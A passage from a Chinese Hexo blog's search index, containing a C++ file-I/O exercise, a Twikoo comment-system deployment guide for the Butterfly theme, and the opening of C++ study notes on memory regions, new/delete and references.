class="built_in">close</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-编写程序，向文件-1-dat-写入具有如下结构的-10-个学生的信息，然后从文件中查找名叫”Zhang-San”的同学的所学专业。">3. 编写程序，向文件 1.dat 写入具有如下结构的 10 个学生的信息，然后从文件中查找名叫”Zhang San”的同学的所学专业。</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line"><span class="keyword">friend</span> istream&amp; <span class="keyword">operator</span>&gt;&gt;(istream&amp; is, Student&amp; st);</span><br><span class="line"><span class="keyword">friend</span> ostream&amp; <span class="keyword">operator</span>&lt;&lt;(ostream&amp; os, <span class="type">const</span> Student&amp; st);</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">string name;<span class="type">int</span> age;string major;</span><br><span class="line"><span class="built_in">Student</span>()&#123;&#125;</span><br><span class="line"><span class="built_in">Student</span>(string n, <span class="type">int</span> a, string m) :<span class="built_in">name</span>(n), <span class="built_in">age</span>(a), <span class="built_in">major</span>(m) &#123;&#125;</span><br><span class="line">~<span class="built_in">Student</span>() &#123;&#125;&#125;;</span><br><span class="line">istream&amp; <span class="keyword">operator</span>&gt;&gt;(istream&amp; is, Student&amp; st) &#123;</span><br><span class="line">is &gt;&gt; st.name;is &gt;&gt; st.age;is &gt;&gt; st.major;</span><br><span class="line"><span class="keyword">return</span> is;&#125;</span><br><span class="line">ostream&amp; <span class="keyword">operator</span>&lt;&lt;(ostream&amp; os, <span class="type">const</span> Student&amp; st) &#123;</span><br><span class="line">os &lt;&lt; st.name &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; st.age &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; st.major &lt;&lt; endl;<span class="keyword">return</span> os;&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="function">ofstream <span class="title">fout</span><span class="params">(<span class="string">&quot;test09.txt&quot;</span>)</span></span>;</span><br><span class="line">Student s[<span class="number">2</span>];</span><br><span class="line">Student t;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入第&quot;</span> &lt;&lt; i + <span class="number">1</span> &lt;&lt; <span class="string">&quot;学生信息:&quot;</span>;</span><br><span class="line">cin &gt;&gt; t.name &gt;&gt; t.age &gt;&gt; t.major;</span><br><span class="line">s[i] = t;&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;fout &lt;&lt; s[i];&#125;</span><br><span class="line">ifstream fin;</span><br><span class="line">fin.<span class="built_in">open</span>((<span class="string">&quot;test09.txt&quot;</span>), ios::in);</span><br><span class="line">Student s2;</span><br><span class="line"><span class="keyword">while</span> (fin &gt;&gt; s2) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(<span class="built_in">strcmp</span>(s2.name.<span class="built_in">c_str</span>(), <span class="string">&quot;张三&quot;</span>))) &#123;</span><br><span class="line">cout &lt;&lt; s2.major &lt;&lt; endl;&#125;&#125;</span><br><span class="line">fout.<span class="built_in">close</span>();</span><br><span class="line">        fin.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 🔔魔法铃铛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在Hexo的Butterfly主题博客配置Twikoo</title>
      <link href="/posts/hat8zc/"/>
      <url>/posts/hat8zc/</url>
      
        <content type="html"><![CDATA[<h2 id="前言-5">前言</h2><p>Twikoo 是基于腾讯云开发的一个简洁、安全、无后端的静态网站评论系统。具有免费搭建、注重隐私安全、支持邮箱和微信通知、支持反垃圾评论、支持调用最新评论、支持评论点赞等特点。</p><h2 id="部署">部署</h2><p>橙子使用的是<code>Vercel 部署</code>，<s>嘻，免费的不用白不用</s> ，据橙子的使用情况访问速度不慢体验感非常好</p><ol><li>创建免费 <a href="https://www.mongodb.com/cloud/atlas/register">MongoDB</a> 数据库，区域推荐选择 AWS / N. Virginia (us-east-1)</li><li>在 Clusters 页面点击 CONNECT，按步骤设置允许所有 IP 地址的连接，创建数据库用户，并记录数据库连接字符串，请将连接字符串中的   修改为数据库密码</li><li>申请 <a href="https://vercel.com/signup">Vercel</a> 账号</li><li>点击按钮将 Twikoo 一键部署到 Vercel  <a class="btn-beautify " href="/%5Bhttps:/vercel.com/import/project?template=https:/github.com/imaegoo/twikoo/tree/dev/src/vercel-min%5D(https:/vercel.com/import/project?template=https:/github.com/imaegoo/twikoo/tree/dev/src/vercel-min)"   title="Deploy"><i class="far fa-hand-point-right"></i><span>Deploy</span></a></li><li>进入 Settings - Environment Variables，添加环境变量 MONGODB_URI，值为第 3 步的数据库连接字符串</li><li>进入 Overview，点击 Domains 下方的链接，如果环境配置正确，可以看到 “Twikoo 云函数运行正常” 的提示</li><li>Vercel Domains（包含 https:// 前缀，例如 <a href="https://xxx.vercel.app">https://xxx.vercel.app</a>）即为您的环境 id</li></ol><h2 id="Butterfly">Butterfly</h2><ol><li>修改主题配置文件</li></ol><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">comments:</span></span><br><span class="line">  <span class="comment"># Up to two comments system, the first will be shown as default</span></span><br><span class="line">  <span class="comment"># Choose: Disqus/Disqusjs/Livere/Gitalk/Valine/Waline/Utterances/Facebook Comments/Twikoo</span></span><br><span class="line">  <span class="attr">use:</span> <span class="string">Twikoo</span> <span class="comment">#修改这里，其他的随意</span></span><br><span class="line">  <span class="attr">text:</span> <span class="literal">true</span> <span class="comment"># Display the comment name next to the button</span></span><br><span class="line">  <span class="comment"># lazyload: The comment system will be load when comment element enters the browser&#x27;s viewport.</span></span><br><span class="line">  <span class="comment"># If you set it to true, the comment count will be invalid</span></span><br><span class="line">  <span class="attr">lazyload:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">count:</span> <span class="literal">true</span> <span class="comment"># Display comment count in top_img</span></span><br><span class="line">  <span class="attr">card_post_count:</span> <span class="literal">false</span> <span class="comment"># Display comment count in Home Page</span></span><br></pre></td></tr></table></figure><ol><li>在配置文件中添加这个</li></ol><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">twikoo:</span></span><br><span class="line">  <span class="attr">envId:</span></span><br><span class="line">  <span class="attr">region:</span></span><br><span class="line">  <span class="attr">visitor:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">option:</span></span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">解释</th></tr></thead><tbody><tr><td style="text-align:center">envId</td><td style="text-align:center">环境 ID</td></tr><tr><td style="text-align:center">region</td><td style="text-align:center">环境地域，默认为 ap-shanghai，如果您的环境地域不是上海，需传此参数</td></tr><tr><td style="text-align:center">visitor</td><td style="text-align:center">是否显示文章閲读数</td></tr><tr><td style="text-align:center">option</td><td style="text-align:center">可选配置</td></tr></tbody></table><h2 id="问题">问题</h2><p>当你想进行图片上传时发现出现了 <code>图片未配置</code> 的现象，三种解决方法：</p><ol><li>进入<code>Twikoo 管理面板</code>，取消图片插入功能</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Cheng1622/image/image.m9ih3vzrz28.webp#alt=Twikoo%20%E7%AE%A1%E7%90%86%E9%9D%A2%E6%9D%BF" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/Cheng1622/image/image.60dlo8wmof00.webp#alt=%E5%8F%96%E6%B6%88%E5%9B%BE%E7%89%87%E6%8F%92%E5%85%A5%E5%8A%9F%E8%83%BD" alt=""> 2. 使用<a href="https://7bu.top/">7bu</a>，注册配置 token 即可使用，<s>不过，现在要钱了，心痛</s> 3. 换成腾讯云的 <s>呜呜，要更多钱了</s></p>]]></content>
      
      
      <categories>
          
          <category> 🧹魔法扫帚 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Butterfly </tag>
            
            <tag> Hexo </tag>
            
            <tag> Twikoo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c++之学习资料</title>
      <link href="/posts/dn9gd2/"/>
      <url>/posts/dn9gd2/</url>
      
        <content type="html"><![CDATA[<h2 id="C-核心编程">C++核心编程</h2><p>本阶段主要针对 C++面向对象编程技术做详细讲解，探讨 C++中的核心和精髓。</p><h2 id="1-内存分区模型">1 内存分区模型</h2><p>C++程序在执行时，将内存大方向划分为<strong>4 个区域</strong></p><ul><li>代码区：存放函数体的二进制代码，由操作系统进行管理的</li><li>全局区：存放全局变量和静态变量以及常量</li><li>栈区：由编译器自动分配释放, 存放函数的参数值,局部变量等</li><li>堆区：由程序员分配和释放,若程序员不释放,程序结束时由操作系统回收</li></ul><p><strong>内存四区意义：</strong></p><p>不同区域存放的数据，赋予不同的生命周期, 给我们更大的灵活编程</p><h3 id="1-1-程序运行前">1.1 程序运行前</h3><pre><code>在程序编译后，生成了exe可执行程序，**未执行该程序前**分为两个区域**代码区：**存放 CPU 执行的机器指令代码区是**共享**的，共享的目的是对于频繁被执行的程序，只需要在内存中有一份代码即可代码区是**只读**的，使其只读的原因是防止程序意外地修改了它的指令**全局区：**全局变量和静态变量存放在此.全局区还包含了常量区, 字符串常量和其他常量也存放在此.该区域的数据在程序结束后由操作系统释放.</code></pre><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//全局变量</span></span><br><span class="line"><span class="type">int</span> g_a = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> g_b = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//全局常量</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> c_g_a = <span class="number">10</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> c_g_b = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//局部变量</span></span><br><span class="line"><span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印地址</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;局部变量a地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;a &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;局部变量b地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;b &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;全局变量g_a地址为： &quot;</span> &lt;&lt;  (<span class="type">int</span>)&amp;g_a &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;全局变量g_b地址为： &quot;</span> &lt;&lt;  (<span class="type">int</span>)&amp;g_b &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//静态变量</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> s_a = <span class="number">10</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> s_b = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;静态变量s_a地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;s_a &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;静态变量s_b地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;s_b &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;字符串常量地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;<span class="string">&quot;hello world&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;字符串常量地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;<span class="string">&quot;hello world1&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;全局常量c_g_a地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;c_g_a &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;全局常量c_g_b地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;c_g_b &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> c_l_a = <span class="number">10</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> c_l_b = <span class="number">10</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;局部常量c_l_a地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;c_l_a &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;局部常量c_l_b地址为： &quot;</span> &lt;&lt; (<span class="type">int</span>)&amp;c_l_b &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：</p><ul><li>C++中在程序运行前分为全局区和代码区</li><li>代码区特点是共享和只读</li><li>全局区中存放全局变量、静态变量、常量</li><li>常量区中存放 const 修饰的全局常量   和 字符串常量</li></ul><h3 id="1-2-程序运行后">1.2 程序运行后</h3><pre><code>**栈区：**由编译器自动分配释放, 存放函数的参数值,局部变量等注意事项：不要返回局部变量的地址，栈区开辟的数据由编译器自动释放</code></pre><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> * <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">return</span> &amp;a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *p = func();</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; *p &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; *p &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>**堆区：**由程序员分配释放,若程序员不释放,程序结束时由操作系统回收在C++中主要利用new在堆区开辟内存</code></pre><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>* <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span>* a = new <span class="type">int</span>(<span class="number">10</span>);</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *p = func();</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; *p &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; *p &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><p>堆区数据由程序员管理开辟和释放</p><p>堆区数据利用 new 关键字进行开辟内存</p><h3 id="1-3-new-操作符">1.3 new 操作符</h3><pre><code>C++中利用new操作符在堆区开辟数据堆区开辟的数据，由程序员手动开辟，手动释放，释放利用操作符 delete语法：`new 数据类型`利用new创建的数据，会返回该数据对应的类型的指针</code></pre><p><strong>示例 1： 基本语法</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>* <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span>* a = new <span class="type">int</span>(<span class="number">10</span>);</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *p = func();</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; *p &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; *p &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//利用delete释放堆区数据</span></span><br><span class="line">delete p;</span><br><span class="line"></span><br><span class="line"><span class="comment">//cout &lt;&lt; *p &lt;&lt; endl; //报错，释放的空间不可访问</span></span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例 2：开辟数组</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//堆区开辟数组</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>* arr = new <span class="type">int</span>[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">arr[i] = i + <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; arr[i] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//释放数组 delete 后加 []</span></span><br><span class="line">delete[] arr;</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-引用">2 引用</h2><h3 id="2-1-引用的基本使用">2.1 引用的基本使用</h3><p>**作用： **给变量起别名</p><p><strong>语法：</strong> <code>数据类型 &amp;别名 = 原名</code></p><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> &amp;b = a;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;b = &quot;</span> &lt;&lt; b &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">b = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;b = &quot;</span> &lt;&lt; b &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-引用注意事项">2.2 引用注意事项</h3><ul><li>引用必须初始化</li><li>引用在初始化后，不可以改变</li></ul><p>示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">20</span>;</span><br><span class="line"><span class="comment">//int &amp;c; //错误，引用必须初始化</span></span><br><span class="line"><span class="type">int</span> &amp;c = a; <span class="comment">//一旦初始化后，就不可以更改</span></span><br><span class="line">c = b; <span class="comment">//这是赋值操作，不是更改引用</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;b = &quot;</span> &lt;&lt; b &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;c = &quot;</span> &lt;&lt; c &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-3-引用做函数参数">2.3 引用做函数参数</h3><p>**作用：**函数传参时，可以利用引用的技术让形参修饰实参</p><p>**优点：**可以简化指针修改实参</p><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1. 值传递</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">mySwap01</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line"><span class="type">int</span> temp = a;</span><br><span class="line">a = b;</span><br><span class="line">b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 地址传递</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">mySwap02</span><span class="params">(<span class="type">int</span>* a, <span class="type">int</span>* b)</span> &#123;</span><br><span class="line"><span class="type">int</span> temp = *a;</span><br><span class="line">*a = *b;</span><br><span class="line">*b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3. 引用传递</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">mySwap03</span><span class="params">(<span class="type">int</span>&amp; a, <span class="type">int</span>&amp; b)</span> &#123;</span><br><span class="line"><span class="type">int</span> temp = a;</span><br><span class="line">a = b;</span><br><span class="line">b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">20</span>;</span><br><span 